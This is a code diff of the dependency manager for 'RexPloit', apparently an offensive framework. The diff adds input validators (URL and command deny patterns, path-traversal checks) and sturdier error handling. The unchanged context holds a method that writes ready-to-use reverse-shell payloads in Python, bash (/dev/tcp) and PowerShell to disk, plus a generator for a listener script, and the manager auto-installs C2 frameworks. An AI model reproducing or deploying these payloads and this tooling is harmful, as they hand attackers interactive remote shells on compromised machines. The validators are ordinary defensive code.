@@ -9,13 +9,14 @@ Provides fallback methods and contingency replacement tools
 import os
 import sys
 import shutil
-import platform
 import subprocess
 import tempfile
 import tarfile
 import zipfile
 import requests
 import json
+import re
+from pathlib import Path
 from rich.console import Console
 from rich.panel import Panel
 from rich.progress import Progress, SpinnerColumn, TextColumn
@@ -23,30 +24,139 @@ from rich.progress import Progress, SpinnerColumn, TextColumn
 # Console for rich output
 console = Console()
 
+
+class SecurityValidator:
+    """Security validation utilities for RexPloit"""
+
+    @staticmethod
+    def validate_url(url):
+        """Validate URL to prevent SSRF attacks"""
+        if not url or not isinstance(url, str):
+            return False
+
+        # Basic URL validation
+        if not re.match(r'^https?://', url):
+            return False
+
+        # Block local/private addresses
+        blocked_patterns = [
+            r'localhost',
+            r'127\.0\.0\.1',
+            r'192\.168\.',
+            r'10\.',
+            r'172\.(1[6-9]|2[0-9]|3[01])\.',
+            r'0\.0\.0\.0',
+            r'::1',
+            r'fc00:',
+            r'fe80:',
+        ]
+
+        for pattern in blocked_patterns:
+            if re.search(pattern, url, re.IGNORECASE):
+                console.print(f"[red]Security: Blocked potentially dangerous URL: {url}[/red]")
+                return False
+
+        return True
+
+    @staticmethod
+    def validate_filename(filename):
+        """Validate filename to prevent directory traversal"""
+        if not filename or not isinstance(filename, str):
+            return False
+
+        # Check for directory traversal attempts
+        if '..' in filename or '/' in filename or '\\' in filename:
+            console.print(f"[red]Security: Invalid filename detected: {filename}[/red]")
+            return False
+
+        # Check for null bytes
+        if '\x00' in filename:
+            console.print(f"[red]Security: Null byte detected in filename: {filename}[/red]")
+            return False
+
+        return True
+
+    @staticmethod
+    def validate_path(path, allowed_base_paths=None):
+        """Validate file path to prevent directory traversal"""
+        if not path or not isinstance(path, str):
+            return False
+
+        try:
+            resolved_path = Path(path).resolve()
+
+            if allowed_base_paths:
+                for base_path in allowed_base_paths:
+                    base_resolved = Path(base_path).resolve()
+                    if resolved_path.is_relative_to(base_resolved):
+                        return True
+                console.print(f"[red]Security: Path outside allowed directories: {path}[/red]")
+                return False
+
+            return True
+        except (OSError, ValueError):
+            console.print(f"[red]Security: Invalid path: {path}[/red]")
+            return False
+
+    @staticmethod
+    def validate_command(command):
+        """Validate command to prevent injection"""
+        if not command or not isinstance(command, str):
+            return False
+
+        # Block dangerous commands
+        dangerous_patterns = [
+            r'[;&|`$]',  # Command separators and substitution
+            r'\$\(',     # Command substitution
+            r'<\(',      # Process substitution
+            r'>\(',      # Process substitution
+            r'\|\|',     # OR operator
+            r'&&',       # AND operator
+        ]
+
+        for pattern in dangerous_patterns:
+            if re.search(pattern, command):
+                console.print(f"[red]Security: Potentially dangerous command blocked: {command}[/red]")
+                return False
+
+        return True
+
+
 class DependencyManager:
     """Manages dependencies for RexPloit Framework"""
-    
+
     def __init__(self, config_dir="config", c2_dir="c2_frameworks"):
+        # Validate input paths
+        if not SecurityValidator.validate_path(config_dir):
+            raise ValueError(f"Invalid config directory path: {config_dir}")
+        if not SecurityValidator.validate_path(c2_dir):
+            raise ValueError(f"Invalid C2 directory path: {c2_dir}")
+
         self.config_dir = config_dir
         self.c2_dir = c2_dir
         self.dependencies_file = os.path.join(config_dir, "dependencies.json")
         self.temp_dir = tempfile.mkdtemp()
-        
-        # Ensure directories exist
-        os.makedirs(config_dir, exist_ok=True)
-        os.makedirs(c2_dir, exist_ok=True)
-        
+        self.allowed_base_paths = [
+            os.path.abspath(config_dir),
+            os.path.abspath(c2_dir),
+            self.temp_dir
+        ]
+
+        # Ensure directories exist with secure permissions
+        os.makedirs(config_dir, mode=0o750, exist_ok=True)
+        os.makedirs(c2_dir, mode=0o750, exist_ok=True)
+
         # Create default dependencies file if it doesn't exist
         if not os.path.exists(self.dependencies_file):
             self._create_default_dependencies()
-            
+
     def __del__(self):
         """Clean up temporary files"""
         try:
             shutil.rmtree(self.temp_dir, ignore_errors=True)
-        except:
+        except (OSError, FileNotFoundError):
             pass
-            
+
     def _create_default_dependencies(self):
         """Create default dependencies configuration"""
         default_deps = {
@@ -89,10 +199,10 @@ class DependencyManager:
                 {"name": "nmap", "required": False, "install_command": "apt-get install -y nmap", "check_command": "which nmap"}
             ]
         }
-        
+
         with open(self.dependencies_file, 'w') as f:
             json.dump(default_deps, f, indent=4)
-            
+
     def load_dependencies(self):
         """Load dependencies from configuration file"""
         try:
@@ -103,7 +213,7 @@ class DependencyManager:
             self._create_default_dependencies()
             with open(self.dependencies_file, 'r') as f:
                 return json.load(f)
-                
+
     def _check_python_package(self, pkg):
         """Check if a specific Python package is installed"""
         try:
@@ -114,30 +224,30 @@ class DependencyManager:
             return True
         except Exception:
             return False
-            
+
     def check_python_packages(self, auto_install=True):
         """Check required Python packages"""
         deps = self.load_dependencies()
         missing_packages = []
-        
+
         with Progress(
             SpinnerColumn(),
             TextColumn("[progress.description]{task.description}"),
             transient=True,
         ) as progress:
             task = progress.add_task("[cyan]Checking Python packages...", total=len(deps["python_packages"]))
-            
+
             for pkg in deps["python_packages"]:
                 progress.update(task, description=f"[cyan]Checking {pkg['name']}...")
-                
+
                 if not self._check_python_package(pkg):
                     missing_packages.append(pkg)
-                    
+
                 progress.update(task, advance=1)
-                
+
         if missing_packages:
             console.print(f"[yellow]Missing {len(missing_packages)} Python packages[/yellow]")
-            
+
             if auto_install:
                 self.install_python_packages(missing_packages)
             else:
@@ -146,33 +256,33 @@ class DependencyManager:
                     title="Missing Python Packages",
                     border_style="yellow"
                 ))
-                
+
             return False
         else:
             console.print("[green]All Python packages are installed[/green]")
             return True
-            
+
     def install_python_packages(self, packages):
         """Install missing Python packages"""
         console.print("[cyan]Installing missing Python packages...[/cyan]")
-        
+
         with Progress(
             SpinnerColumn(),
             TextColumn("[progress.description]{task.description}"),
             transient=False,
         ) as progress:
             task = progress.add_task("[cyan]Installing packages...", total=len(packages))
-            
+
             for pkg in packages:
                 pkg_spec = f"{pkg['name']}{pkg['version'] or ''}"
                 progress.update(task, description=f"[cyan]Installing {pkg_spec}...")
-                
+
                 try:
                     subprocess.check_call([sys.executable, "-m", "pip", "install", pkg_spec])
                     progress.update(task, description=f"[green]Installed {pkg_spec}")
                 except subprocess.CalledProcessError:
                     progress.update(task, description=f"[red]Failed to install {pkg_spec}")
-                    
+
                     # Try fallback if specified
                     if pkg["fallback"]:
                         fallback_spec = pkg["fallback"]
@@ -180,11 +290,11 @@ class DependencyManager:
                         try:
                             subprocess.check_call([sys.executable, "-m", "pip", "install", fallback_spec])
                             progress.update(task, description=f"[green]Installed fallback {fallback_spec}")
-                        except:
-                            progress.update(task, description=f"[red]Fallback installation failed for {pkg_spec}")
-                            
+                        except subprocess.CalledProcessError as e:
+                            progress.update(task, description=f"[red]Fallback installation failed for {pkg_spec}: {e}")
+
                 progress.update(task, advance=1)
-                
+
         # Check if all packages are now installed
         missing = []
         for pkg in packages:
@@ -192,47 +302,48 @@ class DependencyManager:
                 __import__(pkg["name"])
             except ImportError:
                 missing.append(pkg["name"])
-                
+
         if missing:
             console.print(f"[bold red]Failed to install: {', '.join(missing)}[/bold red]")
             return False
         else:
             console.print("[bold green]All packages installed successfully[/bold green]")
             return True
-            
+
     def _check_c2_framework(self, framework):
         """Check if a specific C2 framework is installed"""
         check_cmd = framework["check_command"]
         try:
             result = subprocess.run(check_cmd, shell=True, capture_output=True)
             return result.returncode == 0
-        except:
+        except (subprocess.SubprocessError, OSError) as e:
+            console.print(f"[yellow]Warning: Failed to check framework: {e}[/yellow]")
             return False
-            
+
     def check_c2_frameworks(self, auto_install=True):
         """Check required C2 frameworks"""
         deps = self.load_dependencies()
         missing_frameworks = []
-        
+
         with Progress(
             SpinnerColumn(),
             TextColumn("[progress.description]{task.description}"),
             transient=True,
         ) as progress:
             task = progress.add_task("[cyan]Checking C2 frameworks...", total=len(deps["c2_frameworks"]))
-            
+
             for framework in deps["c2_frameworks"]:
                 progress.update(task, description=f"[cyan]Checking {framework['name']}...")
-                
+
                 # Check if framework is installed
                 if not self._check_c2_framework(framework):
                     missing_frameworks.append(framework)
-                    
+
                 progress.update(task, advance=1)
-                
+
         if missing_frameworks:
             console.print(f"[yellow]Missing {len(missing_frameworks)} C2 frameworks[/yellow]")
-            
+
             if auto_install:
                 self.install_c2_frameworks(missing_frameworks)
             else:
@@ -241,32 +352,32 @@ class DependencyManager:
                     title="Missing C2 Frameworks",
                     border_style="yellow"
                 ))
-                
+
             return False
         else:
             console.print("[green]All C2 frameworks are installed[/green]")
             return True
-            
+
     def install_c2_frameworks(self, frameworks):
         """Install missing C2 frameworks"""
         console.print("[cyan]Installing missing C2 frameworks...[/cyan]")
-        
+
         with Progress(
             SpinnerColumn(),
             TextColumn("[progress.description]{task.description}"),
             transient=False,
         ) as progress:
             task = progress.add_task("[cyan]Installing frameworks...", total=len(frameworks))
-            
+
             for framework in frameworks:
                 progress.update(task, description=f"[cyan]Installing {framework['name']}...")
-                
+
                 try:
                     self._download_and_install_framework(framework, progress)
                     progress.update(task, description=f"[green]Installed {framework['name']}")
                 except Exception as e:
                     progress.update(task, description=f"[red]Failed to install {framework['name']}: {str(e)}")
-                    
+
                     # Try fallback if specified
                     if framework["fallback"]:
                         fallback = framework["fallback"]
@@ -276,89 +387,161 @@ class DependencyManager:
                                 try:
                                     self._download_and_install_framework(fb_framework, progress)
                                     progress.update(task, description=f"[green]Installed fallback {fallback}")
-                                except:
-                                    progress.update(task, description=f"[red]Fallback installation failed for {fallback}")
+                                except Exception as e:
+                                    progress.update(task, description=f"[red]Fallback installation failed for {fallback}: {e}")
                                 break
-                                
+
                 progress.update(task, advance=1)
-                
+
     def _download_and_install_framework(self, framework, progress):
-        """Download and install a C2 framework"""
+        """Download and install a C2 framework with security validations"""
         name = framework["name"]
         url = framework["download_url"]
         install_path = os.path.join(self.c2_dir, framework["install_path"])
-        
-        # Create framework directory
-        os.makedirs(os.path.dirname(install_path), exist_ok=True)
-        
-        # Download file
+
+        # Security validations
+        if not SecurityValidator.validate_url(url):
+            raise ValueError(f"Invalid or unsafe URL: {url}")
+
+        if not SecurityValidator.validate_filename(framework["install_path"]):
+            raise ValueError(f"Invalid install path: {framework['install_path']}")
+
+        if not SecurityValidator.validate_path(install_path, self.allowed_base_paths):
+            raise ValueError(f"Install path outside allowed directories: {install_path}")
+
+        # Create framework directory with secure permissions
+        os.makedirs(os.path.dirname(install_path), mode=0o750, exist_ok=True)
+
+        # Download file with security checks
         progress.update(None, description=f"[cyan]Downloading {name}...")
         local_file = os.path.join(self.temp_dir, os.path.basename(url))
-        
-        response = requests.get(url, stream=True)
-        with open(local_file, 'wb') as f:
-            for chunk in response.iter_content(chunk_size=8192):
-                f.write(chunk)
-                
-        # Extract or copy file
+
+        # Validate local filename
+        if not SecurityValidator.validate_filename(os.path.basename(url)):
+            raise ValueError(f"Invalid filename in URL: {url}")
+
+        try:
+            # Set timeout and size limits for security
+            response = requests.get(url, stream=True, timeout=30)
+            response.raise_for_status()
+
+            # Check content size (limit to 100MB)
+            content_length = response.headers.get('content-length')
+            if content_length and int(content_length) > 100 * 1024 * 1024:
+                raise ValueError(f"File too large: {content_length} bytes")
+
+            # Download with progress tracking
+            downloaded = 0
+            max_size = 100 * 1024 * 1024  # 100MB limit
+
+            with open(local_file, 'wb') as f:
+                for chunk in response.iter_content(chunk_size=8192):
+                    if downloaded + len(chunk) > max_size:
+                        raise ValueError("File size exceeds maximum allowed size")
+                    downloaded += len(chunk)
+                    f.write(chunk)
+
+            # Verify file integrity
+            if downloaded == 0:
+                raise ValueError("Downloaded file is empty")
+
+        except requests.RequestException as e:
+            raise Exception(f"Download failed: {e}")
+
+        # Extract or copy file with security checks
         progress.update(None, description=f"[cyan]Extracting {name}...")
-        
-        if url.endswith('.zip'):
-            with zipfile.ZipFile(local_file, 'r') as zip_ref:
-                zip_ref.extractall(self.c2_dir)
-        elif url.endswith('.tar.gz') or url.endswith('.tgz'):
-            with tarfile.open(local_file, 'r:gz') as tar:
-                tar.extractall(self.c2_dir)
-        else:
-            # Binary file, just copy
-            shutil.copy(local_file, install_path)
-            os.chmod(install_path, 0o755)  # Make executable
-            
+
+        try:
+            if url.endswith('.zip'):
+                with zipfile.ZipFile(local_file, 'r') as zip_ref:
+                    # Validate all file paths in the archive
+                    for member in zip_ref.namelist():
+                        if not SecurityValidator.validate_filename(os.path.basename(member)):
+                            raise ValueError(f"Invalid filename in archive: {member}")
+
+                        # Check for zip bombs and path traversal
+                        if member.startswith('/') or '..' in member:
+                            raise ValueError(f"Unsafe path in archive: {member}")
+
+                    # Extract to secure location
+                    zip_ref.extractall(self.c2_dir)
+            elif url.endswith('.tar.gz') or url.endswith('.tgz'):
+                with tarfile.open(local_file, 'r:gz') as tar:
+                    # Validate all file paths in the archive
+                    for member in tar.getnames():
+                        if not SecurityValidator.validate_filename(os.path.basename(member)):
+                            raise ValueError(f"Invalid filename in archive: {member}")
+
+                        # Check for tar bombs and path traversal
+                        if member.startswith('/') or '..' in member:
+                            raise ValueError(f"Unsafe path in archive: {member}")
+
+                    tar.extractall(self.c2_dir)
+            else:
+                # Binary file, just copy with validation
+                if not SecurityValidator.validate_path(install_path, self.allowed_base_paths):
+                    raise ValueError(f"Invalid install path: {install_path}")
+
+                shutil.copy(local_file, install_path)
+                os.chmod(install_path, 0o755)  # Make executable
+
+        except (zipfile.BadZipFile, tarfile.TarError, OSError) as e:
+            raise Exception(f"Archive extraction failed: {e}")
+
         # Check if installation was successful
         check_cmd = framework["check_command"]
+        if not SecurityValidator.validate_command(check_cmd):
+            raise ValueError(f"Invalid check command: {check_cmd}")
+
         current_dir = os.getcwd()
-        os.chdir(self.c2_dir)
-        
         try:
-            result = subprocess.run(check_cmd, shell=True, capture_output=True)
+            os.chdir(self.c2_dir)
+            result = subprocess.run(check_cmd, shell=True, capture_output=True, timeout=30)
             if result.returncode != 0:
                 raise Exception(f"Installation check failed for {name}")
         finally:
             os.chdir(current_dir)
-            
+
     def _check_system_tool(self, tool):
         """Check if a specific system tool is installed"""
         check_cmd = tool["check_command"]
-        try:
-            result = subprocess.run(check_cmd, shell=True, capture_output=True)
-            return result.returncode == 0
-        except:
+
+        # Validate command for security
+        if not SecurityValidator.validate_command(check_cmd):
+            console.print(f"[red]Security: Invalid check command for {tool.get('name', 'unknown')}[/red]")
             return False
-            
+
+        try:
+            result = subprocess.run(check_cmd, shell=True, capture_output=True, timeout=30)
+            return result.returncode == 0
+        except (subprocess.SubprocessError, OSError, subprocess.TimeoutExpired) as e:
+            console.print(f"[yellow]Warning: Failed to check system tool {tool.get('name', 'unknown')}: {e}[/yellow]")
+            return False
+
     def check_system_tools(self, auto_install=True):
         """Check required system tools"""
         deps = self.load_dependencies()
         missing_tools = []
-        
+
         with Progress(
             SpinnerColumn(),
             TextColumn("[progress.description]{task.description}"),
             transient=True,
         ) as progress:
             task = progress.add_task("[cyan]Checking system tools...", total=len(deps["system_tools"]))
-            
+
             for tool in deps["system_tools"]:
                 progress.update(task, description=f"[cyan]Checking {tool['name']}...")
-                
+
                 # Check if tool is installed
                 if not self._check_system_tool(tool):
                     missing_tools.append(tool)
-                    
+
                 progress.update(task, advance=1)
-                
+
         if missing_tools:
             console.print(f"[yellow]Missing {len(missing_tools)} system tools[/yellow]")
-            
+
             if auto_install:
                 self.install_system_tools(missing_tools)
             else:
@@ -367,65 +550,66 @@ class DependencyManager:
                     title="Missing System Tools",
                     border_style="yellow"
                 ))
-                
+
             return False
         else:
             console.print("[green]All system tools are installed[/green]")
             return True
-            
+
     def install_system_tools(self, tools):
         """Install missing system tools"""
         console.print("[cyan]Installing missing system tools...[/cyan]")
-        
+
         # Check if running as root or with sudo
         if os.geteuid() != 0:
             console.print("[bold red]Error: Root privileges required to install system tools.[/bold red]")
             console.print("[yellow]Try running with sudo or as root.[/yellow]")
             return False
-            
+
         with Progress(
             SpinnerColumn(),
             TextColumn("[progress.description]{task.description}"),
             transient=False,
         ) as progress:
             task = progress.add_task("[cyan]Installing tools...", total=len(tools))
-            
+
             for tool in tools:
                 progress.update(task, description=f"[cyan]Installing {tool['name']}...")
-                
+
                 try:
                     subprocess.check_call(tool["install_command"], shell=True)
                     progress.update(task, description=f"[green]Installed {tool['name']}")
                 except subprocess.CalledProcessError:
                     progress.update(task, description=f"[red]Failed to install {tool['name']}")
-                    
+
                 progress.update(task, advance=1)
-                
+
         # Check if all tools are now installed
         missing = []
         for tool in tools:
             try:
-                result = subprocess.run(tool["check_command"], shell=True, capture_output=True)
+                result = subprocess.run(tool["check_command"], shell=True, capture_output=True, timeout=30)
                 if result.returncode != 0:
                     missing.append(tool["name"])
-            except:
+            except (subprocess.SubprocessError, OSError, subprocess.TimeoutExpired) as e:
+                console.print(f"[yellow]Warning: Failed to verify {tool['name']}: {e}[/yellow]")
                 missing.append(tool["name"])
-                
+
         if missing:
             console.print(f"[bold red]Failed to install: {', '.join(missing)}[/bold red]")
             return False
         else:
             console.print("[bold green]All tools installed successfully[/bold green]")
             return True
-            
+
     def check_all_dependencies(self, auto_install=True):
         """Check all dependencies"""
         console.print(Panel("[bold blue]RexPloit Dependency Manager[/bold blue]", border_style="blue"))
-        
+
         system_tools_ok = self.check_system_tools(auto_install)
         python_packages_ok = self.check_python_packages(auto_install)
         c2_frameworks_ok = self.check_c2_frameworks(auto_install)
-        
+
         if system_tools_ok and python_packages_ok and c2_frameworks_ok:
             console.print("[bold green]All dependencies satisfied![/bold green]")
             return True
@@ -434,34 +618,34 @@ class DependencyManager:
             if not auto_install:
                 console.print("Run with --install to automatically install missing dependencies.")
             return False
-            
+
     def create_contingency_payloads(self):
         """Create contingency payloads for fallback scenarios"""
         console.print("[cyan]Generating contingency payloads...[/cyan]")
-        
+
         payloads_dir = "payloads/contingency"
         os.makedirs(payloads_dir, exist_ok=True)
-        
+
         # Generate fallback payloads for different scenarios
         contingency_payloads = {
             "minimal_python_reverse_tcp.py": """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{LHOST}}",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""",
-            
+
             "minimal_bash_reverse_tcp.sh": """bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1""",
-            
+
             "minimal_powershell_reverse_tcp.ps1": """$client = New-Object System.Net.Sockets.TCPClient("{{LHOST}}",{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
         }
-        
+
         for filename, content in contingency_payloads.items():
             filepath = os.path.join(payloads_dir, filename)
             with open(filepath, 'w') as f:
                 f.write(content)
-                
+
         console.print(f"[green]Created {len(contingency_payloads)} contingency payloads[/green]")
-        
+
     def setup_fallback_listener(self, host="0.0.0.0", port=4444):
         """Setup fallback listener when C2 frameworks fail"""
         console.print(f"[cyan]Setting up fallback listener on {host}:{port}...[/cyan]")
-        
+
         try:
             # Create simple Python listener script
             listener_script = f"""#!/usr/bin/env python3
@@ -489,12 +673,12 @@ def handle_client(client_socket, addr):
 def main():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
+
     try:
         server.bind(("{host}", {port}))
         server.listen(5)
         print(f"[*] Fallback listener running on {host}:{port}")
-        
+
         while True:
             client, addr = server.accept()
             client_handler = threading.Thread(target=handle_client, args=(client, addr))
@@ -511,16 +695,16 @@ def main():
 if __name__ == "__main__":
     main()
 """
-            
+
             listener_path = os.path.join(self.c2_dir, "fallback_listener.py")
             with open(listener_path, 'w') as f:
                 f.write(listener_script)
-                
+
             os.chmod(listener_path, 0o755)  # Make executable
-            
+
             console.print(f"[green]Fallback listener script created at {listener_path}[/green]")
             return listener_path
-            
+
         except Exception as e:
             console.print(f"[bold red]Failed to setup fallback listener: {str(e)}[/bold red]")
             return None
@@ -528,19 +712,19 @@ if __name__ == "__main__":
 # If run directly, check dependencies
 if __name__ == "__main__":
     import argparse
-    
+
     parser = argparse.ArgumentParser(description="RexPloit Dependency Manager")
     parser.add_argument("--install", action="store_true", help="Automatically install missing dependencies")
     parser.add_argument("--contingency", action="store_true", help="Create contingency payloads")
     parser.add_argument("--listener", action="store_true", help="Setup fallback listener")
-    
+
     args = parser.parse_args()
-    
+
     manager = DependencyManager()
     manager.check_all_dependencies(args.install)
-    
+
     if args.contingency:
         manager.create_contingency_payloads()
-        
+
     if args.listener:
         manager.setup_fallback_listener()
